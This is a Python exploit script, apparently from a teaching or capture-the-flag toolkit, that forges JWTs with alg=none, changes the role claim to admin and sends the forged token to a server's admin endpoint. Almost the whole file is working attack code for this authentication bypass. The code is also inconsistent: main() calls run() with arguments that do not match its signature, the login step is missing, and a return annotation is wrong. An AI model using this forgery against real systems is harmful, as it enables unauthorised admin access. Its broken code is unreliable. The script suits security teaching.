"""
=============================================================================
ATTACK 1: alg:none JWT Bypass
=============================================================================
Person 2 — Offensive JWT Attack Toolkit

VULNERABILITY: CVE-2015-9235
MITRE ATT&CK: T1550.001 - Use Alternate Authentication Material

DESCRIPTION:
  The JWT specification allows alg=none for "unsecured" tokens.
  Vulnerable implementations that trust the header's alg value will
  accept a token with alg=none and skip signature verification entirely.

  An attacker can:
    1. Obtain any valid JWT (even a low-privilege one)
    2. Decode it
    3. Modify the payload (e.g., role=user → role=admin)
    4. Re-encode with alg=none and an empty signature
    5. Submit the forged token — the server accepts it

USAGE:
    python none_attack.py --target http://localhost:5001 --username alice --password password123

OUTCOME:
    Retrieves FLAG{jwt_bypass_success} from /admin
=============================================================================
"""

import sys
import json
import base64
import argparse
import requests
from utils import decode_jwt_parts, b64url_encode, b64url_decode, print_banner, print_success, print_error, print_info, print_token_diff


def craft_none_token(original_token: str, new_payload: dict | None = None) -> str:
    """
    Forge a JWT with alg=none and no signature.

    Steps:
      1. Decode original token (without verification)
      2. Replace header alg with 'none'
      3. Optionally modify payload
      4. Re-encode header + payload with empty signature

    Args:
        original_token: A legitimate JWT (from any source)
        new_payload:    Override payload fields (e.g., {"role": "admin"})

    Returns:
        Forged JWT string with alg=none
    """
    header, payload, _ = decode_jwt_parts(original_token)

    # ── Step 1: Modify header
    forged_header = {"alg": "none", "typ": "JWT"}

    # ── Step 2: Modify payload
    forged_payload = payload.copy()
    if new_payload:
        forged_payload.update(new_payload)

    # ── Step 3: Encode (no signature — empty string after the dot)
    h_enc = b64url_encode(json.dumps(forged_header, separators=(",", ":")))
    p_enc = b64url_encode(json.dumps(forged_payload, separators=(",", ":")))

    # alg=none → signature MUST be empty string (just a trailing dot)
    forged_token = f"{h_enc}.{p_enc}."

    return forged_token, forged_header, forged_payload


def run(token: str, target: str, set_claims: list) -> bool:
    print_banner("ATTACK 1 — alg:none JWT Bypass")

    print_info(f"Legitimate token: {token[:60]}...")

    # Parse set_claims list into dict
    new_claims = {}
    if set_claims:
        for claim in set_claims:
            if '=' in claim:
                k, v = claim.split('=', 1)
                new_claims[k] = v

    # ── Phase 2: Forge the alg:none admin token
    print_info("\nStep 2: Forging alg=none admin token...")

    forged_token, forged_header, forged_payload = craft_none_token(
        token,
        new_payload=new_claims if new_claims else {"role": "admin"},
    )

    print_token_diff(token, forged_token)

    print_info(f"Forged header:  {json.dumps(forged_header, indent=2)}")
    print_info(f"Forged payload: {json.dumps(forged_payload, indent=2)}")
    print_info(f"Forged token: {forged_token}")

    # ── Phase 3: Access target with forged token
    print_info(f"\nStep 3: Accessing {target} with forged token...")
    admin_resp = requests.get(
        target,
        headers={"Authorization": f"Bearer {forged_token}"},
        timeout=5,
    )

    if admin_resp.status_code == 200:
        data = admin_resp.json()
        print_success("🚨 ATTACK SUCCESSFUL!")
        print_success(f"FLAG: {data.get('flag')}")
        print_success(f"Response: {json.dumps(data, indent=2)}")
        return True
    else:
        print_error(f"Attack failed: {admin_resp.status_code} — {admin_resp.text}")
        return False


# ─────────────────────────────────────────────────────────────
# CLI Entry Point
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="JWT alg:none attack — CVE-2015-9235",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python none_attack.py
  python none_attack.py --target http://localhost:5001 --username alice --password password123
  python none_attack.py --target http://localhost:5001 --username alice --password password123 --alg RS256
        """,
    )
    parser.add_argument("--target",   default="http://localhost:5001", help="API base URL")
    parser.add_argument("--username", default="alice",        help="Valid username")
    parser.add_argument("--password", default="password123",  help="Valid password")
    parser.add_argument("--alg",      default="HS256",        choices=["HS256", "RS256"], help="Initial token algorithm")

    args = parser.parse_args()
    success = run(args.target, args.username, args.password, args.alg)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
